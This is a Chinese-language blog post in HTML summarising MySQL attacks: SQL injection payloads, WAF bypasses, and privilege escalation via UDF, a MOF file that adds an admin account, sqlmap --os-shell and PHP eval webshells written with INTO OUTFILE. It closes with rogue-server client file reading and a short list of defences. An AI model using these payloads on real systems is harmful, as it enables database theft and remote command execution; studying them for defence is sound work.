@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="终于找到一个空闲的时间，可以把Mysql这块的内容好好地整理、总结一番了，也是给自己理一下思路。这篇文章总结了Mysql注入、提权以及Mysql的一些其他攻击。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql安全总结">
+<meta property="og:url" content="http://yoursite.com/2020/08/01/sql-security/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="终于找到一个空闲的时间，可以把Mysql这块的内容好好地整理、总结一番了，也是给自己理一下思路。这篇文章总结了Mysql注入、提权以及Mysql的一些其他攻击。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-01T09:12:50.000Z">
+<meta property="article:modified_time" content="2020-08-04T01:05:10.945Z">
+<meta property="article:author" content="ananaskr">
+<meta property="article:tag" content="MYSQL">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/08/01/sql-security/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Mysql安全总结 | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/About/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/01/sql-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Mysql安全总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-01 17:12:50" itemprop="dateCreated datePublished" datetime="2020-08-01T17:12:50+08:00">2020-08-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-04 09:05:10" itemprop="dateModified" datetime="2020-08-04T09:05:10+08:00">2020-08-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>终于找到一个空闲的时间，可以把Mysql这块的内容好好地整理、总结一番了，也是给自己理一下思路。这篇文章总结了Mysql注入、提权以及Mysql的一些其他攻击。</p>
+<a id="more"></a>
+
+<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>sql注入是web应用程序对于用户输入没有进行足够的安全检查，使得输入的sql语句直接拼接到事先定义的语句中，使得其被执行。</p>
+<h2 id="判断SQL注入"><a href="#判断SQL注入" class="headerlink" title="判断SQL注入"></a>判断SQL注入</h2><p>一般而言，有以下几种方式</p>
+<ul>
+<li><code>&#39; ``&quot;``\</code>使其产生报错</li>
+<li><code>and 1=1</code>/<code>and 1=2</code>对比页面内容</li>
+<li><code>and sleep(5)</code>对比响应时间</li>
+</ul>
+<h2 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询指的就是最普通的那种在select的where语句后面直接拼接union的方式。</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注的出现是在无法通过页面的回显来直接获取到数据时，通过侧信道的方式来获取。这种方式需要一个差异，包括响应时间的差异和页面返回结果的差异。因此在sql语句中需要构造布尔表达式，使得布尔表达式的真假影响语句执行结果。</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
+<li>sleep()</li>
+<li>benchmark()</li>
+<li>笛卡尔积<ul>
+<li>选择一个大的表来做笛卡尔积<br><code>SELECT count(*) FROM information_schema.columns A, information_schema.columns B;</code>    </li>
+</ul>
+</li>
+<li>get_lock()<ul>
+<li>利用有限</li>
+</ul>
+</li>
+<li>正则bug</li>
+</ul>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入在sql注入中是一种很常见的注入方式。此种利用方式需要页面将报错信息回显出来。</p>
+<ul>
+<li>溢出报错<ul>
+<li>exp()<br><code>exp(~(select * from (select user())x))</code></li>
+</ul>
+</li>
+<li>xpath语法报错(mysql &gt;= 5.1.5)<ul>
+<li>etractvalue<br><code>select extractvalue(1,concat(0x7e,(select @@version),0x7e));</code></li>
+<li>updatexml<br><code>select updatexml(1,concat(0x7e,(select @@version),0x7e));</code></li>
+</ul>
+</li>
+<li>主键重复报错<ul>
+<li>count()和group by遇到rand()产生重复值时报错<br><code>select count(*) from group by concat(version(),floor(rand(0)*2));</code> </li>
+</ul>
+</li>
+<li>列名重复报错<ul>
+<li>join<br><code>select * from (select * from test a join test b)c</code></li>
+</ul>
+</li>
+<li>几何函数报错<ul>
+<li>geometrycollection()</li>
+<li>multipoint()<br><code>select multipoint((select * from (select * from (select version())a)b));</code></li>
+<li>ploygon()</li>
+<li>multipolygon()</li>
+<li>linestring()</li>
+<li>multilinestring() </li>
+</ul>
+</li>
+<li>GTID函数报错<ul>
+<li>GTID_SUBSET()</li>
+<li>GTID_SUBTRACT()</li>
+</ul>
+</li>
+</ul>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入主要是源于数据库编码与应用程序的编码设置不同所导致的。更具体一点来说是，mysql数据库中设置了GBK编码，会认为两个字符是一个汉字，从而在转义符前加入一个ASCII大于128的字符，将转义符吃掉，从而保留了单引号。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%5c%27 &#x3D;&gt; \&#39; </span><br><span class="line">%df%5c%%27 &#x3D;&gt; 汉字&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>大多数的网站都会对用户输入的语句进行特殊符号的转义，由于存入数据库的仍然是未转义的字符，若存在某个地方直接从数据库中取出存入的数据且未做检查，则会造成二次注入。</p>
+<blockquote>
+<p>题目可参考sqli_libs的第24关  </p>
+</blockquote>
+<h3 id="mysql约束攻击"><a href="#mysql约束攻击" class="headerlink" title="mysql约束攻击"></a>mysql约束攻击</h3><p>约束攻击经常出现的点是在用户注册处.利用mysql的select查询进行字符串比较时，不同长度的字符串，会用空格填充到相同字符再比较。mysql插入数据时，当数据超过定义的长度会出现截断现象。</p>
+<h2 id="按照注入点"><a href="#按照注入点" class="headerlink" title="按照注入点"></a>按照注入点</h2><h3 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h3><p>对于select语句的注入，注入点通常在where语句后面，通常是结合union一起完成注入。</p>
+<h3 id="insert注入、update注入"><a href="#insert注入、update注入" class="headerlink" title="insert注入、update注入"></a>insert注入、update注入</h3><p>insert类型的注入一般注入点在values函数里面。  </p>
+<ul>
+<li>有回显<ul>
+<li>采用按位<code>|</code>按位<code>^</code>获取数据<br><code>insert into table values (0|(select hex(database())),&#39;test&#39;);</code><br><code>insert into table values (&#39;0&#39;|(select database()),&#39;test&#39;);</code></li>
+</ul>
+</li>
+<li>盲注<br>  <code>insert into table values (1 xor sleep(2),&#39;test&#39;);</code><br>  <code>insert into table values (&#39;0&#39;&amp;sleep(2),&#39;test&#39;);</code> </li>
+<li>无回显且无法盲注<ul>
+<li>DNSLog    </li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>数据库的严格模式下，不能将整数型转为string型。</p>
+</blockquote>
+<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by注入的一个重点是它后面几可以填一个列名，也可以填一个数字。它一般用于<code>报错注入</code>和<code>盲注</code>。</p>
+<ul>
+<li><p>报错注入</p>
+<ul>
+<li>updatexml<br><code>select * from ha order by updatexml(1,if(1=1,1,user()),1);</code></li>
+<li>extractvalue<br><code>select * from ha order by extractvalue(1,if(1=1,1,user()));</code></li>
+</ul>
+</li>
+<li><p>盲注</p>
+<ul>
+<li>与union语句联合使用时，可利用order by注入来盲注出某一字断的值。将字段值与填入的字符串一位一位比较。<br><code>union select 1,2,&#39;string&#39; order by 3</code></li>
+<li>if()。根据不同列名，结果不一样<br><code>if(1=1,id,username)</code>需要知道列名<br><code>if(expr,1,(select id from information_schema.tables))</code>不需要列名</li>
+<li>时间盲注<br><code>if(1=1,1,sleep(1))</code></li>
+<li>rand()。<br><code>order by rand(true)/rand(false)</code><br><code>order by rand(ascii(mid((select database()),1,1))&gt;96)</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>limit后面可以跟两个函数PROCEDURE和INTO。PROCEDURE里面的报错函数只能使用extractvalue，延时函数只能使用benchmark。</p>
+<ul>
+<li>PROCEDURE (5.0.0&lt;Mysql &lt;5.6.6)<br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1);</code><br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></li>
+</ul>
+<blockquote>
+<p>1) 新版mysql不支持在analyse里面使用select;2)使用时间盲注时，不能直接使用sleep()，需要使用BENCHMARK代替。    </p>
+</blockquote>
+<ul>
+<li>INTO (需要有写权限)<br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 INTO outfile/dumpfile &#39;xxx&#39;;</code> </li>
+</ul>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ol>
+<li><p><strong>逗号</strong></p>
+<ol>
+<li>在字符串截取mid()这样的函数中，使用from 1 for 1.<code>mid(version(),1,1) =&gt;</code></li>
+<li>limit处的逗号. <code>limit 1,1 =&gt; limit 1 offset 1</code> </li>
+<li>union处的逗号. <code>join</code></li>
+</ol>
+</li>
+<li><p><strong>空格</strong></p>
+<ol>
+<li>多层括号嵌套</li>
+<li>使用注释/**/</li>
+<li>使用不可见字符(%0a,%0b,%0d,%a0,%09)</li>
+<li><code>and!!!!~~1=1</code></li>
+<li>科学计数法0e绕过 <code>userid=0e1union</code></li>
+</ol>
+</li>
+<li><p><strong>括号</strong></p>
+<ol>
+<li>order by 大小比较盲注 </li>
+</ol>
+</li>
+<li><p><strong>特殊函数</strong></p>
+<ol>
+<li>字符串截取函数<ol>
+<li>left(str,index)</li>
+<li>right(str,index)</li>
+<li>substr(str,index)</li>
+<li>substring(str,index,len)</li>
+<li>mid(str,index,len)  </li>
+</ol>
+</li>
+<li>字符串比较<ol>
+<li>strcmp(expr1,expr2)</li>
+<li>find_in_set(str,strlist)  </li>
+<li>if()</li>
+</ol>
+</li>
+<li>字符转换函数<ol>
+<li>hex()</li>
+<li>bin()</li>
+<li>ord()</li>
+<li>ascii() </li>
+</ol>
+</li>
+<li>字符串连接函数<ol>
+<li>concat()</li>
+<li>concat_ws()</li>
+<li>group_concat()</li>
+<li>lpad()</li>
+<li>rpad()</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="敏感字符过滤"><a href="#敏感字符过滤" class="headerlink" title="敏感字符过滤"></a>敏感字符过滤</h3><ol>
+<li>编码</li>
+<li>双写绕过 (未进行递归过滤)</li>
+<li>大小写绕过</li>
+<li>运算符</li>
+</ol>
+<h3 id="单引号被转义"><a href="#单引号被转义" class="headerlink" title="单引号被转义"></a>单引号被转义</h3><ul>
+<li>宽字节注入</li>
+<li>编码，字符串可用十六进制表示</li>
+</ul>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
+<li>预编译。预编译的作用有两个。<ul>
+<li>提高执行速度。</li>
+<li>预防sql注入。预防绝大部分的SQL注入。因为order by后面的语句不能用预编译。若模版可控，也会SQL注入。</li>
+<li>mysql的预编译是将此类SQL语句中的值用占位符替代，可以说是将SQL语句参数化/模版化。</li>
+</ul>
+</li>
+<li>黑名单/白名单</li>
+<li>特殊字符转义</li>
+<li>关闭错误提示</li>
+<li>统一编码</li>
+<li>使用数据库严格模式，防止截断</li>
+</ul>
+<h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><h3 id="5-0以上与5-0以下版本的区别"><a href="#5-0以上与5-0以下版本的区别" class="headerlink" title="5.0以上与5.0以下版本的区别"></a>5.0以上与5.0以下版本的区别</h3><ul>
+<li>5.0以上版本存在有information_schema表</li>
+</ul>
+<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h1><p>Mysql提权是指在已经获得mysql的root用户权限下，对其他目录具有写权限的情况下，将<code>mysql数据库操作权限</code>提升为<code>mysql进程系统命令执行权限</code>。</p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF提权即user defined function(用户自定义函数)，通过添加新函数，对MYSQL的功能进行扩充，后续就可以像使用concat()这样的内置方法来使用添加的新函数。  </p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
+<li>mysql &gt; 5.1<ul>
+<li>dll/so文件必须放置在mysql安装目录的libplugin文件夹下</li>
+</ul>
+</li>
+</ul>
+<h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><ul>
+<li><p>获取udf文件。sqlmap以及metasploit里面都有，根据操作系统版本、位数划分。</p>
+</li>
+<li><p>将udf文件放入指定的位置。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create database udf;</span><br><span class="line">create table udfdump(c blob);</span><br><span class="line">insert into udfdump values(unhex(xxxxx));</span><br><span class="line">select c from udfdump into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;test.so&#39;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Mysql大于5.1时，需放置在Mysql根目录的lib/plugin文件夹下。可通过在数据库中执行以下语句查看。<code>select @@plugin_dir;</code></p>
+</blockquote>
+<ul>
+<li>从udf文件中引入自定义函数。</li>
+</ul>
+<p><code>CREATE FUNCTION sys_eval() RETURNS STRING SONAME &#39;udf.dll&#39;</code></p>
+<ul>
+<li>执行自定义函数 </li>
+</ul>
+<p><code>SELECT sys_eval(&#39;id&#39;)</code></p>
+<h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><ul>
+<li>sqlmap</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d &#39;mysql:&#x2F;&#x2F;root:root@192.168.0.32:3306&#x2F;mysql&#39; --os-shell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>metasploit</li>
+</ul>
+<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>mof是windows的托管对象格式，提权是利用了<font color=#008000><code>c:/windows/system32/wbem/mof/nullevt.mof</code>文件每分钟都会在一个特定的时间去执行一次的特性。</font>通过将cmd命令写入该mof文件，从而被执行。</p>
+<blockquote>
+<p>针对于低版本的系统进行提权。</p>
+</blockquote>
+<h3 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h3><ul>
+<li>获取mof文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\.\root\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>mof文件中加入待执行的命令。</p>
+<ul>
+<li>写入mof文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;&#39;) into dumpfile &quot;C:\\WINDOWS\\SYSTEM32\\wbem\\mof\\nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="工具利用-1"><a href="#工具利用-1" class="headerlink" title="工具利用"></a>工具利用</h3><h2 id="webshell提权"><a href="#webshell提权" class="headerlink" title="webshell提权"></a>webshell提权</h2><p>webshell提权方式利用的是向web目录中写入shell文件，从而提权。</p>
+<h3 id="提权流程"><a href="#提权流程" class="headerlink" title="提权流程"></a>提权流程</h3><ul>
+<li>当mysql具有web目录写权限时。</li>
+</ul>
+<p><code>SELECT &#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39; into outfile &#39;/var/www/html/1.php&#39;;</code></p>
+<ul>
+<li>当mysql不具有写权限时，但可以设置日志位置。</li>
+</ul>
+<pre><code>set global general_log=&quot;ON&quot;;
+set global general_log=&quot;/var/www/html/1.php&quot;;
+select &quot;&lt;?php eval($_GET[&apos;post&apos;]);?&gt;;&quot;</code></pre><h1 id="0x03-客户端攻击"><a href="#0x03-客户端攻击" class="headerlink" title="0x03 客户端攻击"></a>0x03 客户端攻击</h1><h2 id="mysql客户端任意文件读取"><a href="#mysql客户端任意文件读取" class="headerlink" title="mysql客户端任意文件读取"></a>mysql客户端任意文件读取</h2><p>此攻击方式利用的是<code>LOAD DATA LOCAL INFILE</code>语句从客户端读取本地文件，存入服务器的table中这一特性。通过伪造mysql服务器，即可任意读取客户端本地的文件。</p>
+<ul>
+<li><code>load data infile</code>以及非local加载语句都会收到secure_file_priv的限制</li>
+<li>且客户端读取的文件并不是客户端指定，而是发送到服务端，服务端指定的。</li>
+<li>服务端可以在任何查询语句后恢复文件传输请求</li>
+</ul>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ul>
+<li><p>伪造Mysql服务器 <a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">Rogue-MySql-Server</a></p>
+</li>
+<li><p>等待客户端发送</p>
+</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://www.oniont.cn/index.php/archives/310.html" target="_blank" rel="noopener">MYSQL提权–UDF提权</a></li>
+<li><a href="https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" target="_blank" rel="noopener">MySQL客户端任意文件读取</a></li>
+<li><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></li>
+<li><a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">sql注入之order by注入</a></li>
+<li><a href="https://xz.aliyun.com/t/2288#toc-0" target="_blank" rel="noopener">mysql 延时注入新思路</a></li>
+<li><a href="https://xz.aliyun.com/t/2869#toc-9" target="_blank" rel="noopener">SQL 注入总结</a></li>
+<li><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">Sql注入笔记</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/MYSQL/" rel="tag"># MYSQL</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/22/back-getshell/" rel="prev" title="后台getshell姿势总结">
+      <i class="fa fa-chevron-left"></i> 后台getshell姿势总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/11/phpmailer-vul/" rel="next" title="PHPMailer漏洞总结">
+      PHPMailer漏洞总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-SQL注入"><span class="nav-number">1.</span> <span class="nav-text">0x01 SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断SQL注入"><span class="nav-number">1.1.</span> <span class="nav-text">判断SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#按注入类型"><span class="nav-number">1.2.</span> <span class="nav-text">按注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#联合查询注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">1.2.2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">1.2.3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#宽字节注入"><span class="nav-number">1.2.4.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入"><span class="nav-number">1.2.5.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql约束攻击"><span class="nav-number">1.2.6.</span> <span class="nav-text">mysql约束攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#按照注入点"><span class="nav-number">1.3.</span> <span class="nav-text">按照注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 